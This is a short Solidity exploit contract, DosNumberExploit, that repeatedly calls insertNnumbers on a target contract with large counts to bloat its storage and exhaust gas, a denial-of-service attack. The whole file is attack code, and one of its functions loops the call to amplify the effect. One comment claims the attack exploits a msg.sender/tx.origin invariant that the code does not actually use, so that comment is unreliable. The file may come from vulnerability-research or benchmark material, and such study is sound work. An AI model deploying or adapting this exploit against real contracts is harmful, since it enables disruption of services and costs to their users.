pragma solidity ^0.4.25;

interface IDosNumber {
    function insertNnumbers(uint value, uint numbers) external;
}

contract DosNumberExploit {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function triggerDoS() public {
        // Exploits invariant: msg.sender != tx.origin
        // Also tries to create storage bloat and gas exhaustion
        IDosNumber(target).insertNnumbers(123, 1000); // Very high 'numbers'
    }

    // Optional: repeatedly call to bloat
    function repeatDoS(uint times) public {
        for (uint i = 0; i < times; i++) {
            IDosNumber(target).insertNnumbers(123, 1000);
        }
    }
}

